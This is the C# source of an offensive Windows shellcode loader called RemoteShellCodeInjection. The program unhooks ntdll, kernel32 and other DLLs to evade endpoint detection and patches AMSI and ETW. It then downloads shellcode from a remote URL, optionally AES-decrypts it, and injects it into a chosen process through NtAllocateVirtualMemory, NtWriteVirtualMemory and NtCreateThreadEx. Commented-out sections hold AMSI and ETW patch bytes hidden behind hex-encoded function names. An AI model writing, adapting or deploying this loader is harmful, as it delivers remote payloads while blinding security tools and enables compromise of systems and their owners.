using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using RemoteShellCodeInjection.Utils;
namespace RemoteShellCodeInjection
{
    internal class Program
    {
        //[DllImport("kernel32.dll", SetLastError = true)]
        //static extern IntPtr LoadLibrary(string lpFileName);

        //[DllImport("kernel32.dll", SetLastError = true)]
        //static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, uint zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, UIntPtr numberOfBytesToWrite, out UIntPtr numberOfBytesWritten);
        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startRoutine, IntPtr argument, uint createFlags, uint zeroBits, uint stackSize, uint maximumStackSize, IntPtr attributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint newProtect, out uint oldProtect);

        [DllImport(dllName: "ntdll.dll", SetLastError = true)]
        static extern int NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref UIntPtr regionSize, uint freeType);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtClose(IntPtr handle);

        [Flags]
        public enum AllocationType : ulong
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        };

        [Flags]
        public enum ACCESS_MASK : uint
        {
            DELETE = 0x00010000,
            READ_CONTROL = 0x00020000,
            WRITE_DAC = 0x00040000,
            WRITE_OWNER = 0x00080000,
            SYNCHRONIZE = 0x00100000,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            STANDARD_RIGHTS_WRITE = 0x00020000,
            STANDARD_RIGHTS_EXECUTE = 0x00020000,
            STANDARD_RIGHTS_ALL = 0x001F0000,
            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
            ACCESS_SYSTEM_SECURITY = 0x01000000,
            MAXIMUM_ALLOWED = 0x02000000,
            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,
            DESKTOP_READOBJECTS = 0x00000001,
            DESKTOP_CREATEWINDOW = 0x00000002,
            DESKTOP_CREATEMENU = 0x00000004,
            DESKTOP_HOOKCONTROL = 0x00000008,
            DESKTOP_JOURNALRECORD = 0x00000010,
            DESKTOP_JOURNALPLAYBACK = 0x00000020,
            DESKTOP_ENUMERATE = 0x00000040,
            DESKTOP_WRITEOBJECTS = 0x00000080,
            DESKTOP_SWITCHDESKTOP = 0x00000100,
            WINSTA_ENUMDESKTOPS = 0x00000001,
            WINSTA_READATTRIBUTES = 0x00000002,
            WINSTA_ACCESSCLIPBOARD = 0x00000004,
            WINSTA_CREATEDESKTOP = 0x00000008,
            WINSTA_WRITEATTRIBUTES = 0x00000010,
            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
            WINSTA_EXITWINDOWS = 0x00000040,
            WINSTA_ENUMERATE = 0x00000100,
            WINSTA_READSCREEN = 0x00000200,
            WINSTA_ALL_ACCESS = 0x0000037F,

            SECTION_ALL_ACCESS = 0x10000000,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_EXECUTE = 0x0008,
            SECTION_EXTEND_SIZE = 0x0010
        };

        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalRunPEdle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            ConflictingAddresses = 0xc0000018,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InsufficientResources = 0xc000009a,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            ProcessIsTerminating = 0xc000010a,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            InvalidAddress = 0xc0000141,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

        static void Main(string[] args)
        {
            string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
            for (int i = 0; i < ListOfDLLToUnhook.Length; i++)
            {
                SharpUnhooker.JMPUnhooker(ListOfDLLToUnhook[i]);
                SharpUnhooker.EATUnhooker(ListOfDLLToUnhook[i]);
                if (ListOfDLLToUnhook[i] != "ntdll.dll")
                {
                    SharpUnhooker.IATUnhooker(ListOfDLLToUnhook[i]);
                }
            }
            PatchAMSIAndETW.Run();



            bool aes = args.Contains("-aes");
            string url = "";
            string key = "";
            string pname = "";
            bool selfinject = false;
            byte[] assemblyBytes;
            string shellString;
            Process? targetProcess;
            IntPtr hProc = IntPtr.Zero;
            byte[] Key;
            byte[] IV;
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-url":
                        url = args[i + 1];
                        break;
                    case "-key":
                        key = args[i + 1];
                        break;
                    case "-pname":
                        pname = args[i + 1];
                        break;
                    case "-selfinject":
                        selfinject = true;
                        break;
                }
            }

            // Validate the arguments
            if (string.IsNullOrEmpty(url))
            {
                Console.WriteLine("[-] Error: URL is required.");
                return;
            }
            if (aes && string.IsNullOrEmpty(key))
            {
                Console.WriteLine("[-] Error: Key is required when AES  is specified.");
                return;
            }
            if (!string.IsNullOrEmpty(pname) && selfinject)
            {
                Console.WriteLine("[-] Error: Only one of pname or selfinject can be specified.");
                return;
            }




            if (!string.IsNullOrEmpty(pname))
            {
                Console.WriteLine("[*] Process name: " + pname);
                // Get the process handle for the target process
                targetProcess = Process.GetProcessesByName(pname)?.FirstOrDefault();
                if (targetProcess != null)
                {
                    hProc = targetProcess.Handle;
                    Console.WriteLine("[*] Process handle: " + hProc);
                }
                else
                {
                    ConsoleKey response;
                    do
                    {
                        Console.WriteLine("[*] Process: " + pname + " Not found. Do you want to inject in the current process? [y/n]");
                        response = Console.ReadKey(false).Key;
                        if (response != ConsoleKey.Enter)
                            Console.WriteLine();
                    } while (response != ConsoleKey.Y && response != ConsoleKey.N);
                    if (response == ConsoleKey.Y)
                    {
                        selfinject = true;
                    }
                    else
                    {
                        Console.WriteLine("[-] Aborting...");
                        return;
                    }

                }
            }
            if (!selfinject && string.IsNullOrEmpty(pname))
            {
                Console.WriteLine("[-] Aborting: You have specified neither the process to use to inject the shellcode nor  -selfinject argument.");
                return;
            }
            if (selfinject)
            {
                targetProcess = Process.GetCurrentProcess();
                hProc = targetProcess.Handle;
                Console.WriteLine("[*] Self-inject: Using the handle " + hProc);
            }

            try
            {
                Console.WriteLine("[*] Downloading: " + url);
                // Download the remote shellcode
                HttpClient client = new();
                shellString = client.GetStringAsync(url).Result;
                assemblyBytes = shellString.Split(',').Select(s => byte.Parse(s[2..], NumberStyles.HexNumber)).ToArray();

            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Aborting: Check that there are no trailing linebreaks on your shellcode " + ex.Message);
                return;
            }

            if (aes)
            {
                Console.WriteLine("[*] Decrypting the shellcode using KEY/IV: " + key);
                Key = Convert.FromBase64String(key);
                IV = Convert.FromBase64String(key);
                try
                {
                    byte[] ClearedAssemblyBytes = Utils.Utils.AESDecrypt(assemblyBytes, Key, IV);
                    StringBuilder hex = new StringBuilder(ClearedAssemblyBytes.Length * 2);
                    foreach (byte b in ClearedAssemblyBytes)
                    {
                        hex.AppendFormat("0x{0:x2},", b);
                    }
                    assemblyBytes = ClearedAssemblyBytes;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Aborting: " + ex.Message);
                }
            }
            MemoryPatches(hProc);
            Inject(hProc, assemblyBytes);
        }

        private static void Inject(IntPtr hProc, byte[] assemblyBytes)
        {







            // Allocate memory in the target process for the remote assembly
            IntPtr remoteAssembly = IntPtr.Zero;
            UIntPtr remoteAssemblySize = (UIntPtr)1024;
            Console.WriteLine("[*] Allocating memory...");
            NtAllocateVirtualMemory(hProc, ref remoteAssembly, 0, ref remoteAssemblySize, 0x1000, 0x40);
            Console.WriteLine("[*] Copying Shellcode...");
            // Write the remote assembly to the allocated memory in the target process
            NtWriteVirtualMemory(hProc, remoteAssembly, assemblyBytes, (UIntPtr)assemblyBytes.Length, out _);

            Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
            // Create a remote thread in the target process to execute the remote assembly
            IntPtr hThread = IntPtr.Zero;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProc, remoteAssembly, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Thread created with handle {0}! Shellcode executed.", hThread.ToString("X4"));
            Console.WriteLine("\n[+] Press any key to clean the mess.", hThread.ToString("X4"));
            Console.Read();
            // Wait for the remote thread to finish execution
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Read the output of the remote assembly from the target process
            //byte[] outputBuffer = new byte[1024];
            //UIntPtr outputBufferSize = (UIntPtr)outputBuffer.Length;
            //NtReadVirtualMemory(hProc, remoteAssembly, outputBuffer, outputBufferSize, out _);

            // Print the output of the remote assembly
            //  Console.WriteLine(Encoding.UTF8.GetString(outputBuffer));

            //  Clean up
            Console.WriteLine($"[+] Cleaning thread {hThread.ToString("X4")} from the process {hProc}" );
            NtFreeVirtualMemory(hProc, ref remoteAssembly, ref remoteAssemblySize, 0x8000);
            NtClose(hThread);
 


            //IntPtr ProcessHandle = hProc; // pseudo-handle for current process
            //IntPtr ShellcodeBytesLength = new IntPtr(assemblyBytes.Length);
            //IntPtr AllocationAddress = new IntPtr();
            //IntPtr ZeroBitsThatZero = IntPtr.Zero;
            //UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
            //Console.WriteLine("[*] Allocating memory...");
            //NtAllocateVirtualMemory(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
            //Console.WriteLine("[*] Copying Shellcode...");
            //Marshal.Copy(assemblyBytes, 0, AllocationAddress, assemblyBytes.Length);
            //Console.WriteLine("[*] Changing memory protection setting...");
            //UInt32 newProtect = 0;
            //NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
            //IntPtr threadHandle = new IntPtr(0);
            //ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            //IntPtr pObjectAttributes = new IntPtr(0);
            //IntPtr lpParameter = new IntPtr(0);
            //bool bCreateSuspended = false;
            //int stackZeroBits = 0;
            //int sizeOfStackCommit = 0xFFFF;
            //int sizeOfStackReserve = 0xFFFF;
            //IntPtr pBytesBuffer = new IntPtr(0);
            //// create new thread
            //Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
            //NtCreateThreadEx(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            //Console.WriteLine("[+] Thread created with handle {0}! Shellcode executed.", threadHandle.ToString("X4"));


        }

        private static void MemoryPatches(IntPtr hProc)
        {
            //// Patch AMSI 616d73692e646c6c = amsi.dll  416d73695363616e427566666572= AmsiScanBuffer
            //IntPtr amsiAddr = GetProcAddress(LoadLibrary(Utils.Utils.FromHexString("616d73692e646c6c")), Utils.Utils.FromHexString("416d73695363616e427566666572"));
            //byte[] amsiPatch = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
            //uint lpflOldProtect = 0;
            //UIntPtr memPage = (UIntPtr)0x1000;
            //IntPtr amsiAddr_bk = amsiAddr;
            //NtProtectVirtualMemory(hProc, ref amsiAddr_bk, ref memPage, 0x04, out lpflOldProtect);
            //NtWriteVirtualMemory(hProc, amsiAddr, amsiPatch, (UIntPtr)amsiPatch.Length, out UIntPtr _);
            //NtProtectVirtualMemory(hProc, ref amsiAddr_bk, ref memPage, lpflOldProtect, out _);

            //// Patch ETW ntdll.dll = 6e74646c6c2e646c6c EtwEventWrite= 4574774576656e745772697465
            //IntPtr etwAddr = GetProcAddress(LoadLibrary(Utils.Utils.FromHexString("6e74646c6c2e646c6c")), Utils.Utils.FromHexString("4574774576656e745772697465"));
            //byte[] etwPatch = { 0xC3 };
            //IntPtr etwAddr_bk = etwAddr;
            //NtProtectVirtualMemory(hProc, ref etwAddr_bk, ref memPage, 0x04, out lpflOldProtect);
            //NtWriteVirtualMemory(hProc, etwAddr, etwPatch, (UIntPtr)etwPatch.Length, out _);
            //NtProtectVirtualMemory(hProc, ref etwAddr_bk, ref memPage, lpflOldProtect, out _);
        }

    }
}

